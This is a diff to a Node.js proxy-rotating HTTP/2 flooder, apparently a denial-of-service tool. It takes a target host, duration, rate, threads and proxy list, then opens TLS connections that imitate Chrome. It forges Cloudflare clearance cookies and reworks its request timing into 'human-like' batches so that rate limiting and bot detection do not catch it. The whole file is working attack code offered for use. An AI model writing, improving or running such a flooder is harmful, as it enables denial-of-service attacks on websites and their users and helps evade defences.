@@ -68,7 +68,7 @@ function randnum(minLength, maxLength) {
     return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
 }
 
-const cplist = ["TLS_AES_128_CCM_8_SHA256", "TLS_AES_128_CCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256"];
+const cplist = ["TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256"];
 var cipper = cplist[Math.floor(Math.random() * cplist.length)];
 
 const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
@@ -78,10 +78,10 @@ process.on('uncaughtException', (e) => { if (e.code && ignoreCodes.includes(e.co
 process.on('unhandledRejection', (e) => { if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false; });
 require("events").EventEmitter.defaultMaxListeners = 0;
 
-const sigalgs = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"];
+const sigalgs = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384"];
 let SignalsList = sigalgs.join(':');
-const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
-const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_TLSv1_3 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
+const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384";
+const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;
 
 if (process.argv.length < 7) { console.log(`Usage: host time req thread proxy.txt `); process.exit(); }
 
@@ -102,7 +102,7 @@ class NetSocket {
         const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
         const connection = net.connect({ host: options.host, port: options.port });
         connection.setTimeout(options.timeout * 10000);
-        connection.setKeepAlive(true, 10000);
+        connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true);
         connection.on("connect", () => { connection.write(payload); });
         connection.on("data", chunk => {
@@ -153,99 +153,61 @@ function runFlooder() {
     if (!proxyAddr) return;
     const parsedProxy = proxyAddr.split(":");
 
-    // Helper functions for randomness
-    const taoDoiTuongNgauNhien = () => {
-        const obj = {};
-        const count = getRandomInt(2, 3);
-        for (let i = 0; i < count; i++) {
-            obj['cf-sec-' + generateRandomString(1, 9)] = generateRandomString(1, 10) + '-' + generateRandomString(1, 12);
-        }
-        return obj;
+    const ver = getRandomInt(130, 131);
+    const context = {
+        ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver}.0.0.0 Safari/537.36`,
+        ch_ua: `"Google Chrome";v="${ver}", "Chromium";v="${ver}", "Not?A_Brand";v="99"`,
+        cookie: `_ga=GA1.1.${getRandomInt(1e5, 1e9)}; __cf_bm=${randstr(40)}; cf_clearance=${randstr(45)}`
     };
 
-    const shuffleObject = (obj) => {
-        const keys = Object.keys(obj);
-        for (let i = keys.length - 1; i > 0; i--) {
-            const j = Math.floor(Math.random() * (i + 1));
-            [keys[i], keys[j]] = [keys[j], keys[i]];
-        }
-        const shuffled = {};
-        keys.forEach(k => shuffled[k] = obj[k]);
-        return shuffled;
-    };
-
-    const browserType = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "duckduckgo"][Math.floor(Math.random() * 8)];
-    
-    // --- Header Generation Logic ---
-    let baseHeaders = {
-        ":method": "GET",
-        ":authority": parsedTarget.host,
-        ":scheme": "https",
-        ":path": parsedTarget.path + "?" + randstr(5) + "=" + randstr(10), // Unique Query String
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "accept-language": "en-US,en;q=0.9",
-        "accept-encoding": "gzip, deflate, br, zstd",
-        "sec-fetch-dest": "document",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-site": "none",
-        "sec-fetch-user": "?1",
-        "upgrade-insecure-requests": "1",
-    };
-
-    // User-Agent variations based on browserType (simplified for brevity but effective)
-    baseHeaders["user-agent"] = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(110, 125)}.0.0.0 Safari/537.36`;
-
-    const proxyOptions = { host: parsedProxy[0], port: ~~parsedProxy[1], address: parsedTarget.host, timeout: 10 };
+    const proxyOptions = { host: parsedProxy[0], port: ~~parsedProxy[1], address: parsedTarget.host, timeout: 25 };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return;
 
-        const tlsOptions = {
-            secure: true,
-            ALPNProtocols: ["h2"],
-            ciphers: cipper,
-            socket: connection,
-            ecdhCurve: ecdhCurve,
-            secureContext: secureContext,
-            rejectUnauthorized: false,
-            servername: parsedTarget.host,
-        };
-
-        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions);
+        const tlsSocket = tls.connect(443, parsedTarget.host, {
+            secure: true, ALPNProtocols: ["h2"], ciphers: cipper, socket: connection,
+            ecdhCurve: ecdhCurve, secureContext: secureContext, rejectUnauthorized: false,
+            servername: parsedTarget.host, sessionTimeout: 600
+        });
 
         tlsSocket.on('secureConnect', () => {
-            const client = http2.connect(args.target, { createConnection: () => tlsSocket });
+            const client = http2.connect(args.target, { 
+                createConnection: () => tlsSocket,
+                settings: { headerTableSize: 65536, initialWindowSize: 6291456, maxFrameSize: 16384, enablePush: false }
+            });
 
-            const sendRequests = () => {
+            const performRequest = () => {
                 if (client.destroyed) return;
 
-                for (let i = 0; i < args.Rate; i++) {
-                    const dynamicHeaders = shuffleObject({
-                        ...baseHeaders,
-                        ...taoDoiTuongNgauNhien(),
-                        "referer": "https://" + parsedTarget.host + "/" + randstr(5),
-                        "x-request-id": crypto.randomUUID(),
-                    });
+                // Simulasi batch kecil paralel (seperti browser memuat gambar/skrip)
+                const concurrentBatch = getRandomInt(2, 5); 
+                for (let i = 0; i < concurrentBatch; i++) {
+                    const req = client.request({
+                        ":method": "GET", ":authority": parsedTarget.host, ":scheme": "https", ":path": parsedTarget.path,
+                        "user-agent": context.ua, "sec-ch-ua": context.ch_ua, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
+                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                        "sec-fetch-site": "none", "sec-fetch-mode": "navigate", "sec-fetch-dest": "document",
+                        "accept-encoding": "gzip, deflate, br, zstd", "accept-language": "en-US,en;q=0.9", "cookie": context.cookie
+                    }, { weight: 255 });
 
-                    const req = client.request(dynamicHeaders, {
-                        weight: getRandomInt(200, 255),
-                        exclusive: true
-                    });
-                    
-                    req.on('response', () => {
+                    req.on('response', (headers) => {
+                        if (headers[':status'] === 429) {
+                            const retryAfter = headers['retry-after'] ? parseInt(headers['retry-after']) * 1000 : 5000;
+                            setTimeout(performRequest, retryAfter); 
+                            client.close();
+                        }
                         req.close();
-                        req.destroy();
                     });
                     req.end();
                 }
-                
-                // --- Jitter Implementation ---
-                // Berhenti menggunakan setInterval statis, gunakan timeout dinamis
-                const jitter = getRandomInt(100, 1000);
-                setTimeout(sendRequests, jitter);
+
+                // Jeda antara aktivitas (Inter-activity gap)
+                const humanDelay = getRandomInt(3000, 7000); 
+                setTimeout(performRequest, humanDelay);
             };
 
-            sendRequests();
+            performRequest();
         });
 
         tlsSocket.on('error', () => { tlsSocket.destroy(); connection.destroy(); });
